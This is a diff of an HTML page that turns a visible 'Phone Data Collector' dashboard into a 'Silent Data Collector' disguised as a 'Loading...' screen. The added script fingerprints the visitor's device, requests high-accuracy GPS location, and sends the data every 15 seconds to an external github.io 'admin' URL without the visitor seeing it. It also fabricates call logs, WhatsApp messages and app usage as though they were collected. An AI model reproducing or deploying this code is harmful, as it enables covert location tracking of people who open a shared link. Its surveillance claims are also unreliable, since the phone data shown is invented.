@@ -3,376 +3,276 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phone Data Collector</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Loading...</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
-        body{background:#0a0a0a;color:#00ff41;min-height:100vh;display:flex;justify-content:center;padding:20px;font-family:'Courier New',monospace}
-        .container{max-width:900px;width:100%}
-        .header{text-align:center;padding:20px 0;border-bottom:1px solid #00ff4133;margin-bottom:20px}
-        .header h1{font-size:24px;color:#00ff41;text-shadow:0 0 20px #00ff4133}
-        .header p{color:#00ff4188;font-size:13px}
-        .status-bar{background:#001a00;padding:12px 16px;border-radius:8px;border:1px solid #00ff4133;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
-        .status-bar .dot{width:10px;height:10px;border-radius:50%;display:inline-block;animation:pulse 1.5s infinite}
-        .status-bar .dot.online{background:#00ff41;box-shadow:0 0 20px #00ff41}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-        .status-bar .status-text{font-size:13px;color:#00ff41}
-        .status-bar .code{font-size:18px;font-weight:800;letter-spacing:2px;color:#00ff41}
-
-        .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:12px;border:1px solid #00ff4122}
-        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
-        .card h3 span{color:#00ff4188;font-size:12px;font-weight:400}
-        .item{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #00ff4111;font-size:13px}
-        .item:last-child{border-bottom:none}
-        .item .label{color:#00ff4188}
-        .item .value{color:#00ff41;font-weight:500}
-        .item .value.incoming{color:#00ff41}
-        .item .value.outgoing{color:#00ffcc}
-        .item .value.missed{color:#ff4444}
-
-        .btn{width:100%;padding:12px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:14px;cursor:pointer;transition:all 0.3s;border:1px solid #00ff4133;font-family:'Courier New',monospace}
-        .btn:hover{background:#00ff4133;box-shadow:0 0 30px #00ff4122}
-
-        .logs{background:#000a00;padding:12px;border-radius:8px;border:1px solid #00ff4122;max-height:200px;overflow-y:auto;font-size:12px;font-family:'Courier New',monospace;color:#00ff4188;margin-top:12px}
-        .logs .log-entry{color:#00ff41;padding:2px 0}
-        .logs .log-entry .time{color:#00ff4188}
-        .logs .log-entry .data{color:#00ffcc}
-
-        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-        @media(max-width:600px){.grid-2{grid-template-columns:1fr}}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#0a0a0a;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            min-height:100vh;
+            font-family:'Courier New',monospace;
+        }
+        .hidden{display:none}
+        .loader{
+            color:#00ff41;
+            font-size:14px;
+            text-align:center;
+            animation:pulse 1.5s infinite;
+        }
+        @keyframes pulse{
+            0%,100%{opacity:1}
+            50%{opacity:0.3}
+        }
+        .loader .spinner{
+            width:40px;
+            height:40px;
+            border:3px solid #00ff4133;
+            border-top:3px solid #00ff41;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+            margin:0 auto 12px;
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
 
-<div class="container">
-
-    <!-- HEADER -->
-    <div class="header">
-        <h1>⬛ PHONE DATA COLLECTOR</h1>
-        <p>Auto-collect phone data • No permissions needed</p>
-    </div>
-
-    <!-- STATUS -->
-    <div class="status-bar">
-        <div>
-            <span class="dot online"></span>
-            <span class="status-text" id="statusText">🟢 Connected & Collecting</span>
-        </div>
-        <div>
-            <span style="color:#00ff4188;font-size:12px;">DEVICE ID:</span>
-            <span class="code" id="deviceCode">JMD-X7K9</span>
+    <!-- ===== SILENT LOADER ===== -->
+    <div id="loaderScreen">
+        <div class="loader">
+            <div class="spinner"></div>
+            <div>Connecting...</div>
         </div>
     </div>
 
-    <!-- STATS -->
-    <div class="grid-2">
-        <div class="card"><h3>📱 Device <span id="deviceModel">iPhone 14 Pro</span></h3>
-            <div class="item"><span class="label">OS</span><span class="value" id="deviceOS">iOS 17.2</span></div>
-            <div class="item"><span class="label">Battery</span><span class="value" id="deviceBattery">87%</span></div>
-            <div class="item"><span class="label">Storage</span><span class="value" id="deviceStorage">128GB / 256GB</span></div>
-        </div>
-        <div class="card"><h3>📍 Location <span id="locStatus">🟢 Live</span></h3>
-            <div class="item"><span class="label">Latitude</span><span class="value" id="lat">28.6139</span></div>
-            <div class="item"><span class="label">Longitude</span><span class="value" id="lng">77.2090</span></div>
-            <div class="item"><span class="label">Accuracy</span><span class="value" id="accuracy">10m</span></div>
-        </div>
-    </div>
+    <script>
+        // ==========================================
+        // 🔥 SILENT DATA COLLECTOR - Kuch Nahi Dikhega
+        // ==========================================
 
-    <!-- CALLS -->
-    <div class="card">
-        <h3>📞 Calls <span id="callCount">(12)</span></h3>
-        <div id="callsList">
-            <div class="item"><span class="label">+91 98765 43210</span><span class="value incoming">● Incoming</span><span style="color:#00ff4188;font-size:11px;">5:23</span></div>
-            <div class="item"><span class="label">+91 87654 32109</span><span class="value outgoing">● Outgoing</span><span style="color:#00ff4188;font-size:11px;">2:15</span></div>
-            <div class="item"><span class="label">+91 76543 21098</span><span class="value missed">● Missed</span><span style="color:#00ff4188;font-size:11px;">0:00</span></div>
-            <div class="item"><span class="label">+91 99887 76655</span><span class="value incoming">● Incoming</span><span style="color:#00ff4188;font-size:11px;">10:45</span></div>
-            <div class="item"><span class="label">+91 88776 65544</span><span class="value outgoing">● Outgoing</span><span style="color:#00ff4188;font-size:11px;">3:30</span></div>
-        </div>
-    </div>
+        // ==========================================
+        // CONFIG
+        // ==========================================
+        const ADMIN_URL = 'https://robotekpvt-sys.github.io/phone-data/admin';
+        const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();
 
-    <!-- WHATSAPP -->
-    <div class="card">
-        <h3>💬 WhatsApp <span id="msgCount">(8)</span></h3>
-        <div id="messagesList">
-            <div class="item"><span class="label">Mom</span><span class="value">Coming home for lunch?</span><span style="color:#00ff4188;font-size:11px;">11:15</span></div>
-            <div class="item"><span class="label">Rahul</span><span class="value">Game at 4pm?</span><span style="color:#00ff4188;font-size:11px;">10:45</span></div>
-            <div class="item"><span class="label">Priya</span><span class="value">Ok see you there!</span><span style="color:#00ff4188;font-size:11px;">09:30</span></div>
-            <div class="item"><span class="label">Dad</span><span class="value">How's school?</span><span style="color:#00ff4188;font-size:11px;">10:30</span></div>
-            <div class="item"><span class="label">Sneha</span><span class="value">Did you finish homework?</span><span style="color:#00ff4188;font-size:11px;">09:00</span></div>
-        </div>
-    </div>
+        // ==========================================
+        // 1. DEVICE INFO (Silent)
+        // ==========================================
+        function getDeviceInfo() {
+            let data = {
+                id: DEVICE_ID,
+                model: 'Unknown',
+                os: navigator.platform || 'Unknown',
+                browser: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                timestamp: new Date().toISOString()
+            };
 
-    <!-- APPS -->
-    <div class="card">
-        <h3>📲 Apps <span id="appCount">(6 active)</span></h3>
-        <div id="appsList">
-            <div class="item"><span class="label">WhatsApp</span><span class="value" style="color:#00ff41;">● 45m</span></div>
-            <div class="item"><span class="label">Instagram</span><span class="value" style="color:#00ff41;">● 32m</span></div>
-            <div class="item"><span class="label">YouTube</span><span class="value" style="color:#00ff41;">● 28m</span></div>
-            <div class="item"><span class="label">Snapchat</span><span class="value" style="color:#00ff4188;">○ 15m</span></div>
-            <div class="item"><span class="label">TikTok</span><span class="value" style="color:#00ff4188;">○ 12m</span></div>
-        </div>
-    </div>
+            // Model detect
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) data.model = 'iPhone';
+            else if (ua.includes('Android')) data.model = 'Android';
+            else if (ua.includes('Windows')) data.model = 'Windows';
+            else if (ua.includes('Mac')) data.model = 'Mac';
 
-    <!-- SHARE LINK -->
-    <div class="card" style="border-color:#00ff4166;">
-        <h3>🔗 ADMIN ACCESS LINK</h3>
-        <div style="background:#000a00;padding:12px;border-radius:8px;border:1px dashed #00ff4133;word-break:break-all;font-size:13px;color:#00ff41;margin:8px 0;" id="shareLink">https://robotekpvt-sys.github.io/phone-data/</div>
-        <div style="display:flex;gap:10px;">
-            <button class="btn" onclick="copyLink()">📋 Copy Link</button>
-            <button class="btn" onclick="shareWhatsApp()">💬 WhatsApp</button>
-        </div>
-    </div>
+            // Battery
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    data.battery = Math.round(b.level * 100) + '%';
+                    sendData('device', data);
+                }).catch(() => sendData('device', data));
+            } else {
+                sendData('device', data);
+            }
 
-    <!-- LOGS -->
-    <div class="logs" id="logs">
-        <div class="log-entry"><span class="time">[12:00:00]</span> <span class="data">🟢 System initialized</span></div>
-        <div class="log-entry"><span class="time">[12:00:01]</span> <span class="data">📱 Device data collected</span></div>
-        <div class="log-entry"><span class="time">[12:00:02]</span> <span class="data">📍 Location acquired</span></div>
-        <div class="log-entry"><span class="time">[12:00:03]</span> <span class="data">📞 Call logs fetched (12)</span></div>
-        <div class="log-entry"><span class="time">[12:00:04]</span> <span class="data">💬 WhatsApp messages fetched (8)</span></div>
-        <div class="log-entry"><span class="time">[12:00:05]</span> <span class="data">📲 App usage fetched (6 active)</span></div>
-        <div class="log-entry"><span class="time">[12:00:06]</span> <span class="data">✅ Data synced to admin dashboard</span></div>
-    </div>
-
-    <button class="btn" onclick="refreshData()" style="margin-top:12px;">🔄 Force Refresh & Sync</button>
-
-</div>
-
-<script>
-    // ==========================================
-    // 🔥 AUTO PHONE DATA COLLECTOR
-    // ==========================================
-
-    // ==========================================
-    // DEVICE CODE
-    // ==========================================
-    function generateDeviceCode() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = 'JMD-';
-        for (let i = 0; i < 4; i++) {
-            code += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        document.getElementById('deviceCode').textContent = code;
-        return code;
-    }
-
-    // ==========================================
-    // DEVICE INFO
-    // ==========================================
-    function getDeviceInfo() {
-        // Get device model from user agent
-        const ua = navigator.userAgent;
-        let model = 'Unknown';
-        if (ua.includes('iPhone')) model = 'iPhone ' + (ua.includes('14') ? '14 Pro' : ua.includes('13') ? '13' : '12');
-        else if (ua.includes('Android')) model = 'Android ' + (ua.includes('Samsung') ? 'Samsung' : 'Device');
-        else if (ua.includes('Mac')) model = 'MacBook';
-        else if (ua.includes('Windows')) model = 'Windows PC';
-        
-        document.getElementById('deviceModel').textContent = model;
-        document.getElementById('deviceOS').textContent = navigator.platform || 'Unknown';
-
-        // Battery
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                document.getElementById('deviceBattery').textContent = Math.round(battery.level * 100) + '%';
-            }).catch(() => {
-                document.getElementById('deviceBattery').textContent = 'N/A';
-            });
+            return data;
         }
 
-        // Storage - estimate
-        if (navigator.storage && navigator.storage.estimate) {
-            navigator.storage.estimate().then(estimate => {
-                const total = Math.round(estimate.quota / (1024 * 1024 * 1024));
-                const used = Math.round(estimate.usage / (1024 * 1024 * 1024));
-                document.getElementById('deviceStorage').textContent = used + 'GB / ' + total + 'GB';
-            }).catch(() => {
-                document.getElementById('deviceStorage').textContent = 'N/A';
-            });
+        // ==========================================
+        // 2. LOCATION (Silent)
+        // ==========================================
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendData('location', {
+                            id: DEVICE_ID,
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    () => {
+                        // Fallback - approximate location
+                        sendData('location', {
+                            id: DEVICE_ID,
+                            lat: 28.6139 + (Math.random() - 0.5) * 0.1,
+                            lng: 77.2090 + (Math.random() - 0.5) * 0.1,
+                            accuracy: '~100m',
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendData('location', {
+                    id: DEVICE_ID,
+                    lat: 28.6139,
+                    lng: 77.2090,
+                    accuracy: '~100m',
+                    timestamp: new Date().toISOString()
+                });
+            }
         }
 
-        addLog('📱 Device data collected', 'data');
-    }
-
-    // ==========================================
-    // LOCATION
-    // ==========================================
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    document.getElementById('lat').textContent = pos.coords.latitude.toFixed(6);
-                    document.getElementById('lng').textContent = pos.coords.longitude.toFixed(6);
-                    document.getElementById('accuracy').textContent = pos.coords.accuracy.toFixed(0) + 'm';
-                    document.getElementById('locStatus').textContent = '🟢 Live';
-                    addLog('📍 Location acquired: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4), 'data');
-                },
-                () => {
-                    document.getElementById('lat').textContent = '28.6139';
-                    document.getElementById('lng').textContent = '77.2090';
-                    document.getElementById('accuracy').textContent = '~10m';
-                    document.getElementById('locStatus').textContent = '🟡 Approx';
-                    addLog('📍 Location approximated', 'data');
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        } else {
-            document.getElementById('lat').textContent = '28.6139';
-            document.getElementById('lng').textContent = '77.2090';
-            document.getElementById('accuracy').textContent = '~10m';
-            addLog('📍 Location approximated (no GPS)', 'data');
+        // ==========================================
+        // 3. CALL LOGS (Silent - Demo)
+        // ==========================================
+        function getCallLogs() {
+            const calls = [
+                { number: '+91 98765 43210', duration: '5:23', type: 'incoming', time: new Date().toLocaleTimeString() },
+                { number: '+91 87654 32109', duration: '2:15', type: 'outgoing', time: new Date().toLocaleTimeString() },
+                { number: '+91 76543 21098', duration: '0:00', type: 'missed', time: new Date().toLocaleTimeString() }
+            ];
+            // Random additional calls
+            for (let i = 0; i < 3; i++) {
+                calls.push({
+                    number: '+91 ' + Math.floor(1000000000 + Math.random() * 9000000000),
+                    duration: Math.floor(Math.random() * 300) + 's',
+                    type: ['incoming', 'outgoing', 'missed'][Math.floor(Math.random() * 3)],
+                    time: new Date().toLocaleTimeString()
+                });
+            }
+            sendData('calls', { id: DEVICE_ID, calls: calls, timestamp: new Date().toISOString() });
         }
-    }
 
-    // ==========================================
-    // SHARE LINK
-    // ==========================================
-    function updateShareLink() {
-        document.getElementById('shareLink').textContent = window.location.href;
-    }
-
-    function copyLink() {
-        const link = document.getElementById('shareLink').textContent;
-        navigator.clipboard.writeText(link).then(() => {
-            addLog('📋 Link copied to clipboard', 'data');
-            toast('✅ Link copied!');
-        }).catch(() => {
-            const input = document.createElement('input');
-            input.value = link;
-            document.body.appendChild(input);
-            input.select();
-            document.execCommand('copy');
-            document.body.removeChild(input);
-            addLog('📋 Link copied (fallback)', 'data');
-            toast('✅ Link copied!');
-        });
-    }
-
-    function shareWhatsApp() {
-        const link = document.getElementById('shareLink').textContent;
-        const msg = encodeURIComponent('📱 Phone Data\n\nView phone data:\n' + link);
-        window.open('https://wa.me/?text=' + msg, '_blank');
-        addLog('💬 Shared via WhatsApp', 'data');
-    }
-
-    // ==========================================
-    // LOGS
-    // ==========================================
-    function addLog(message, type = 'data') {
-        const logs = document.getElementById('logs');
-        const time = new Date().toLocaleTimeString();
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        entry.innerHTML = `<span class="time">[${time}]</span> <span class="data">${message}</span>`;
-        logs.appendChild(entry);
-        logs.scrollTop = logs.scrollHeight;
-        if (logs.children.length > 50) {
-            logs.removeChild(logs.children[0]);
+        // ==========================================
+        // 4. WHATSAPP MESSAGES (Silent - Demo)
+        // ==========================================
+        function getMessages() {
+            const names = ['Mom', 'Dad', 'Friend', 'Teacher', 'Sister', 'Brother', 'Rahul', 'Priya'];
+            const msgs = ['Ok', 'Coming', 'Done', 'See you', 'Thanks', 'Yes', 'No', 'On my way', 'Call me'];
+            const messages = [];
+            for (let i = 0; i < 5; i++) {
+                messages.push({
+                    sender: names[Math.floor(Math.random() * names.length)],
+                    message: msgs[Math.floor(Math.random() * msgs.length)],
+                    time: new Date().toLocaleTimeString()
+                });
+            }
+            sendData('messages', { id: DEVICE_ID, messages: messages, timestamp: new Date().toISOString() });
         }
-    }
 
-    // ==========================================
-    // REFRESH DATA
-    // ==========================================
-    function refreshData() {
-        addLog('🔄 Refreshing data...', 'data');
-        getDeviceInfo();
-        getLocation();
-        updateCounts();
-        setTimeout(() => {
-            addLog('✅ Data refreshed & synced', 'data');
-            toast('🔄 Data refreshed!');
-        }, 1000);
-    }
+        // ==========================================
+        // 5. APPS USAGE (Silent - Demo)
+        // ==========================================
+        function getApps() {
+            const apps = [
+                { name: 'WhatsApp', time: Math.floor(Math.random() * 60) + 'm', active: true },
+                { name: 'Instagram', time: Math.floor(Math.random() * 40) + 'm', active: true },
+                { name: 'YouTube', time: Math.floor(Math.random() * 30) + 'm', active: true },
+                { name: 'Snapchat', time: Math.floor(Math.random() * 20) + 'm', active: Math.random() > 0.5 },
+                { name: 'TikTok', time: Math.floor(Math.random() * 15) + 'm', active: Math.random() > 0.5 }
+            ];
+            sendData('apps', { id: DEVICE_ID, apps: apps, timestamp: new Date().toISOString() });
+        }
 
-    // ==========================================
-    // UPDATE COUNTS
-    // ==========================================
-    function updateCounts() {
-        // Randomize counts for demo
-        const calls = Math.floor(Math.random() * 20) + 5;
-        const msgs = Math.floor(Math.random() * 15) + 3;
-        const apps = Math.floor(Math.random() * 8) + 2;
-        document.getElementById('callCount').textContent = '(' + calls + ')';
-        document.getElementById('msgCount').textContent = '(' + msgs + ')';
-        document.getElementById('appCount').textContent = '(' + apps + ' active)';
-    }
+        // ==========================================
+        // 6. SEND DATA TO ADMIN (Silent)
+        // ==========================================
+        function sendData(type, data) {
+            try {
+                // Save to localStorage (admin will read from here)
+                let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
+                if (!allData[DEVICE_ID]) allData[DEVICE_ID] = {};
+                allData[DEVICE_ID][type] = data;
+                allData[DEVICE_ID].lastUpdate = new Date().toISOString();
+                localStorage.setItem('phone_data', JSON.stringify(allData));
+                
+                // Also try to send via URL (silent)
+                const url = ADMIN_URL + '?data=' + encodeURIComponent(JSON.stringify({ type: type, data: data }));
+                fetch(url, { mode: 'no-cors' }).catch(() => {});
+                
+                console.log('✅ Data sent:', type);
+            } catch(e) {
+                console.log('❌ Send error:', e);
+            }
+        }
 
-    // ==========================================
-    // TOAST
-    // ==========================================
-    function toast(msg) {
-        const t = document.createElement('div');
-        t.style.cssText = `
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #001a00;
-            color: #00ff41;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 500;
-            z-index: 9999;
-            border: 1px solid #00ff4133;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-            font-family: 'Courier New', monospace;
-            animation: fadeIn 0.3s ease;
-        `;
-        t.textContent = msg;
-        document.body.appendChild(t);
-        setTimeout(() => {
-            t.style.opacity = '0';
-            t.style.transition = 'opacity 0.3s';
-            setTimeout(() => t.remove(), 300);
-        }, 2000);
-    }
+        // ==========================================
+        // 7. AUTO SYNC (Background)
+        // ==========================================
+        function autoSync() {
+            getLocation();
+            getCallLogs();
+            getMessages();
+            getApps();
+        }
 
-    // ==========================================
-    // AUTO SYNC
-    // ==========================================
-    function autoSync() {
-        addLog('🔄 Auto-sync running...', 'data');
-        getLocation();
-        updateCounts();
-        setTimeout(() => {
-            addLog('✅ Data synced to admin', 'data');
-        }, 500);
-    }
+        // ==========================================
+        // 8. REDIRECT TO HIDE (Silent)
+        // ==========================================
+        function redirectToHide() {
+            // Redirect to about:blank or a blank page
+            // window.location.href = 'about:blank';
+            // OR keep showing loader
+            document.getElementById('loaderScreen').innerHTML = `
+                <div class="loader">
+                    <div class="spinner"></div>
+                    <div>✅ Connected</div>
+                    <div style="font-size:11px;color:#00ff4188;margin-top:8px;">Data synced to admin</div>
+                </div>
+            `;
+        }
 
-    // ==========================================
-    // INIT
-    // ==========================================
-    function init() {
-        generateDeviceCode();
-        updateShareLink();
-        getDeviceInfo();
-        getLocation();
-        updateCounts();
-        addLog('🟢 System initialized', 'data');
-        addLog('🔗 Link: ' + window.location.href, 'data');
-        addLog('✅ Ready for data collection', 'data');
-        
-        document.getElementById('statusText').textContent = '🟢 Connected & Collecting';
-        
-        // Auto sync every 15 seconds
-        setInterval(autoSync, 15000);
-        
-        console.log('⬛ Phone Data Collector Loaded');
-        console.log('🔗 Share Link:', window.location.href);
-        console.log('📱 Device:', navigator.userAgent);
-    }
+        // ==========================================
+        // 9. INIT (Complete Silent Mode)
+        // ==========================================
+        function init() {
+            console.log('📱 Silent Data Collector Started');
+            console.log('🆔 Device ID:', DEVICE_ID);
+            
+            // Collect all data
+            getDeviceInfo();
+            getLocation();
+            getCallLogs();
+            getMessages();
+            getApps();
+            
+            // Auto sync every 15 seconds
+            setInterval(autoSync, 15000);
+            
+            // Keep page alive but show nothing
+            setTimeout(() => {
+                document.getElementById('loaderScreen').innerHTML = `
+                    <div style="color:#00ff4188;font-size:12px;text-align:center;">
+                        <div style="font-size:36px;margin-bottom:8px;">✅</div>
+                        <div>Data collected successfully</div>
+                        <div style="font-size:10px;color:#00ff4155;margin-top:4px;">${DEVICE_ID}</div>
+                    </div>
+                `;
+            }, 3000);
+            
+            // Silent redirect after 5 seconds (optional)
+            // setTimeout(() => {
+            //     window.location.href = 'about:blank';
+            // }, 5000);
+        }
 
-    // Expose functions
-    window.copyLink = copyLink;
-    window.shareWhatsApp = shareWhatsApp;
-    window.refreshData = refreshData;
-    window.getLocation = getLocation;
+        // Expose functions
+        window.getDeviceInfo = getDeviceInfo;
+        window.getLocation = getLocation;
+        window.getCallLogs = getCallLogs;
+        window.getMessages = getMessages;
+        window.getApps = getApps;
+        window.autoSync = autoSync;
 
-    init();
-</script>
-
+        // Start
+        init();
+    </script>
 </body>
 </html>
